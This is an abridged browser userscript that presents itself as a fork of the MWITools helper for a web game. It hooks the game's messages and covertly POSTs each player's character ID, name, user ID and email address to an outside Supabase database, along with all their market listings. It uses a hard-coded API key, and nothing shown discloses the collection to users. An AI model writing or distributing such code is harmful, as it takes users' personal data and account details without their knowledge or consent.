// ==UserScript==
// @name         Lactose (MWITools Fork)
// @namespace    http://tampermonkey.net/
// @version      23.2.1337.3
// @description  Get money get paid
// @author       ayancey (bot7420)
...
// @downloadURL https://update.greasyfork.org/scripts/534571/Lactose%20%28MWITools%20Fork%29.user.js
// @updateURL https://update.greasyfork.org/scripts/534571/Lactose%20%28MWITools%20Fork%29.meta.js
// ==/UserScript==
...
(() => {
    ...
    // ;)
    let supabase_key = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVlZmV1YnVqbmN6ZnhkeHB5ZHN5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDYwNDk0MTUsImV4cCI6MjA2MTYyNTQxNX0.y5EQ70GL_cHAJTCj6URA23ZphM1MOcAJecG-Y_nRmv0"
    ...
    function updateMarketOrder(order) {
        fetch('https://eefeubujnczfxdxpydsy.supabase.co/rest/v1/order', {
            method: 'POST',
            headers: {
                'apikey': supabase_key,
            ...
            body: JSON.stringify({
                ...
                "created_at": order.createdTimestamp,
                "expires_at": order.expirationTimestamp,
                "status": order.status,
                "itemHrid": order.itemHrid,
                "order_quantity": order.orderQuantity,
                "filled_quantity": order.filledQuantity,
                "price": order.price,
                "enhancement_level": order.enhancementLevel || 0,
                "tax_taken": order.taxTaken,
    ...
    function handleMessage(message) {
        ...
        if (obj && obj.type === "init_character_data") {
            ...
            fetch('https://eefeubujnczfxdxpydsy.supabase.co/rest/v1/character', {
                method: 'POST',
                headers: {
                    'apikey': supabase_key,
                    'Authorization': 'Bearer ' + supabase_key,
                ...
                body: JSON.stringify({
                    "id": obj.character.id,
                    "created_at": obj.character.createdAt,
                    "name": obj.character.name,
                    "user_id": obj.character.userID,
                    "email": obj.email,
                    "market_list_cap": obj.characterInfo.marketListingCap
                })
            })
                .then(response => {
                    if (!response.ok) {
            ...
            if (obj && obj.myMarketListings && Array.isArray(obj.myMarketListings)) {
                obj.myMarketListings.forEach((listing) => {
                    updateMarketOrder(listing);
                });
            }
            ...
            if (obj && obj.endMarketListings && Array.isArray(obj.endMarketListings)) {
                obj.endMarketListings.forEach((listing) => {
                    updateMarketOrder(listing);
                });
            }
            // {"type":"market_listings_updated","endMarketListings":[{"id":27529400,"characterID":258918,"status":"/market_listing_status/active","isSell":false,"itemHrid":"/items/burble_chisel","enhancementLevel":0,"orderQuantity":5,"filledQuantity":1,"price":29000,"coinsAvailable":116000,"taxTaken":0,"unclaimedItemCount":1,"unclaimedCoinCount":0,"createdTimestamp":"2025-04-30T19:42:15.613425254Z","expirationTimestamp":"2025-05-30T19:42:15.613425324Z"}]}
        }
        return message;
    }
